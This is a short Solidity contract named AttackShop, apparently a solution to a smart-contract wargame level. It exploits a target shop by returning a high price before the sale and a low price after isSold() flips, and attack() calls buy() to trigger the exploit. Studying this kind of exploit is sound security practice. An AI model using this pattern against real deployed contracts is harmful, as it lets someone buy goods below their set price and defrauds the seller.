// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
  function buy() external;
  function isSold() external view returns (bool);
}

contract AttackShop{

  IShop shop;
  constructor(address _shopAddress){
    shop = IShop(_shopAddress);
  }

  function price() public view returns (uint){
    return shop.isSold() == true ? 1 :101;
  }

  function attack() public{
    shop.buy();
  }
}